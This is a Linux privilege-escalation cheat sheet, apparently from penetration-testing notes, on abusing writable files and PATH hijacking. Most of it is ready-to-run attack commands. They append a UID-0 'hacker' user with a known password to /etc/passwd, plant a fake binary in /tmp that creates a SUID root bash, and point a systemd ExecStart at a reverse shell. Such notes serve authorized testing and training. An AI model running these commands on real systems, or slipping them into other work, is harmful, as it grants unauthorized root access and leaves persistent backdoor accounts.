# 🐧 Writable Files & PATH Hijack

> Two related primitives: (1) a **root-writable-by-you** sensitive file (`/etc/passwd`, a service/systemd unit, a script) lets you inject a root user or payload; (2) a privileged program that calls another command by **relative name** lets you hijack `$PATH` to run your own version as root.

Part of [[Linux Privilege Escalation]]. Related: [[SUID & SGID]] · [[Cron Jobs]] · [[Sudo Abuse]]

---

## 🧠 THINK
- **Writable `/etc/passwd`** → add a UID-0 user with a password you know → `su`.
- **Writable systemd/service unit or init script** → set `ExecStart` to your payload → restart → root.
- **Relative command call** in a SUID/sudo/cron program + writable PATH dir → PATH hijack.
- Enumerate world-writable files owned by root and writable config/scripts.

## ⚡ DETECT
```bash
ls -la /etc/passwd /etc/shadow
```
```bash
find / -writable -type f 2>/dev/null | grep -vE '/proc|/sys|/dev'
```
```bash
find / -writable -type d 2>/dev/null | grep -vE '/proc|/sys' | head
```
```bash
systemctl list-unit-files --state=enabled ; ls -la /etc/systemd/system
```
**Look for:** writable `/etc/passwd`, writable `.service`/init scripts, writable dirs that appear in a privileged process's `$PATH`.

## 💥 EXPLOIT
**Writable `/etc/passwd` → add root user:**
```bash
openssl passwd -1 -salt x pass123
```
```bash
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
```
```bash
su hacker        # password: pass123 -> root
```

**Writable service / systemd unit → payload as root:**
```bash
# edit ExecStart to a reverse shell or SUID-bash, then:
sudo systemctl restart <service>     # or wait for restart / reboot
```

**PATH hijack (privileged program calls e.g. `ps`/`service`/`backup` by bare name):**
```bash
cd /tmp
```
```bash
echo -e '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > service
```
```bash
chmod +x service ; export PATH=/tmp:$PATH
```
```bash
<run the privileged program>      # it executes /tmp/service as root
```
```bash
/tmp/rootbash -p
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Writable `/etc/passwd` | append UID-0 user → `su` → root |
| Writable `.service`/init | set ExecStart payload → restart → root |
| Relative call in privileged bin | PATH hijack fake binary → root |
| Writable root cron script | inject payload → [[Cron Jobs]] |
| Writable file read by root process | poison it (config/keys) |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `/etc/passwd` not writable | check `.service` units, cron scripts, PATH-hijack angles |
| Can't restart the service | wait for reboot/auto-restart, or pick a job that reruns ([[Cron Jobs]]) |
| PATH already absolute in the caller | no hijack — need a different vector |
| Nothing writable | pivot to [[Sudo Abuse]]/[[SUID & SGID]]/[[Linux Kernel Exploits]] |

## 📇 CHEAT SHEET
```bash
ls -la /etc/passwd ; find / -writable -type f 2>/dev/null | grep -vE '/proc|/sys'
```
```bash
echo 'hacker:'$(openssl passwd -1 pass123)':0:0::/root:/bin/bash' >> /etc/passwd ; su hacker
```
```bash
cd /tmp; echo -e '#!/bin/sh\n/bin/bash -p' > <cmd>; chmod +x <cmd>; export PATH=/tmp:$PATH
```
**Kill shots:** writable `/etc/passwd` → UID-0 user · relative call → PATH hijack → root.
